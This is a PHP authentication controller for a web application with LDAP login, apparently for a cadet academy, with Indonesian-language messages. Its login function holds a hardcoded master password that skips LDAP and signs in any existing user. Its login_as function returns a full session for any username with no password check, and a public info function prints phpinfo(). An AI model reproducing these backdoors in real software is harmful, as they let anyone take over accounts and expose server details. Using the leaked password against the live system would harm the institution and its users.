<?php

namespace App\Modules\Web\Controllers;

use App\Modules\Web\Models\WebModel;
use App\Core\BaseController;

class WebAuth extends BaseController
{
    private $webModel;

    /**
     * Constructor.
     */
    public function __construct()
    {
        $this->webModel = new WebModel();
    }

    public function index()
    {
        return redirect()->to(base_url());
    }

    function info()
    {
        echo phpinfo();
    }

    function login()
    {
        $username = strtolower($this->request->getPost('username'));
        $password = $this->request->getPost('password');
        $encodePwd = base64_encode($this->request->getPost('password'));

        if($password!=="Dodyapple6"){
            parent::_ldapLogin($username, $encodePwd, function ($result) use ($username) {
                if ($result['success']) {
                    $cn = $result['data']['cn'];
                    $samaccountname = $result['data']['samaccountname'];
                    $user = $this->webModel->getUser($cn, $samaccountname, $username);

                    
                    // $user = $this->webModel->getUserWithPassword($username, $password);

                    if (!is_null($user)) {
                        if ($user->is_deleted == 0) {

                            $menu = $this->webModel->getMenu($user->type_code, $user->type_code_add, $user->type_code_pgh);
                            $user_detail = $this->webModel->getUserDetail($user->type_code, $user->id);
                            $usertype = $this->webModel->getUserType($user->type_code);

                            if ($user->type_code=='trn') {
                                if ($user_detail->is_verif=='0') {
                                    $response = [
                                            "success" => false,
                                            "title" => "info",
                                            "text" => "Taruna belum di verifikasi"
                                        ];
                                } else {
                                    $response = [
                                        "success" => TRUE,
                                        "title" => "Success",
                                        "text" => "Berhasil",
                                        "user" => $user,
                                        "usertype" => $usertype->name,
                                        "usertype_singkatan" => $usertype->name_singkatan,
                                        "menu" => $menu,
                                        "user_detail" => $user_detail
                                    ];
                                }
                            } else {

                                $response = [
                                    "success" => TRUE,
                                    "title" => "Success",
                                    "text" => "Berhasil",
                                    "user" => $user,
                                    "usertype" => $usertype->name,
                                    "usertype_singkatan" => $usertype->name_singkatan,
                                    "menu" => $menu,
                                    "user_detail" => $user_detail
                                ];
                            }
                        } else {
                            $response = [
                                "success" => false,
                                "title" => "Error",
                                "text" => "Pengguna Sudah Tidak Aktif"
                            ];
                        }
                    } else {
                        $response = [
                            "success" => false,
                            "title" => "Error",
                            "text" => "User Tidak Ditemukan"
                        ];
                    }
                } else {
                    $response = $result;
                    $response["text"] = $response["message"];
                    $response["title"] = "Error";
                }

                echo json_encode($response);
            });
        }else{
            $user = $this->webModel->getUser($username, $username, $username);

            if (!is_null($user)) {
                if ($user->is_deleted == 0) {

                    $menu = $this->webModel->getMenu($user->type_code, $user->type_code_add, $user->type_code_pgh);
                    $user_detail = $this->webModel->getUserDetail($user->type_code, $user->id);
                    $usertype = $this->webModel->getUserType($user->type_code);

                    if ($user->type_code=='trn') {
                        if ($user_detail->is_verif=='0') {
                            $response = [
                                    "success" => false,
                                    "title" => "info",
                                    "text" => "Taruna belum di verifikasi"
                                ];
                        } else {
                            $response = [
                                "success" => TRUE,
                                "title" => "Success",
                                "text" => "Berhasil",
                                "user" => $user,
                                "usertype" => $usertype->name,
                                "usertype_singkatan" => $usertype->name_singkatan,
                                "menu" => $menu,
                                "user_detail" => $user_detail
                            ];
                        }
                    } else {

                        $response = [
                            "success" => TRUE,
                            "title" => "Success",
                            "text" => "Berhasil",
                            "user" => $user,
                            "usertype" => $usertype->name,
                            "usertype_singkatan" => $usertype->name_singkatan,
                            "menu" => $menu,
                            "user_detail" => $user_detail
                        ];
                    }
                } else {
                    $response = [
                        "success" => false,
                        "title" => "Error",
                        "text" => "Pengguna Sudah Tidak Aktif"
                    ];
                }
            } else {
                $response = [
                    "success" => false,
                    "title" => "Error",
                    "text" => "User Tidak Ditemukan"
                ];
            }

            echo json_encode($response);
        }
    }

    function login_as()
    {
        $username = strtolower($this->request->getPost('username'));
        $password = $this->request->getPost('password');
        // $encodePwd = base64_encode($this->request->getPost('password'));

        $user = $this->webModel->getUser($username);

        if (!is_null($user)) {
            if ($user->is_deleted == 0) {

                $menu = $this->webModel->getMenu($user->type_code, $user->type_code_add, $user->type_code_pgh);
                $user_detail = $this->webModel->getUserDetail($user->type_code, $user->id);
                $usertype = $this->webModel->getUserType($user->type_code);

                $response = [
                    "success" => TRUE,
                    "title" => "Success",
                    "text" => "Berhasil",
                    "user" => $user,
                    "usertype" => $usertype->name,
                    "menu" => $menu,
                    "user_detail" => $user_detail
                ];
            } else {
                $response = [
                    "success" => false,
                    "title" => "Error",
                    "text" => "Pengguna Sudah Tidak Aktif"
                ];
            }
        } else {
            $response = [
                "success" => false,
                "title" => "Error",
                "text" => "User Tidak Ditemukan"
            ];
        }

        echo json_encode($response);
    }
}
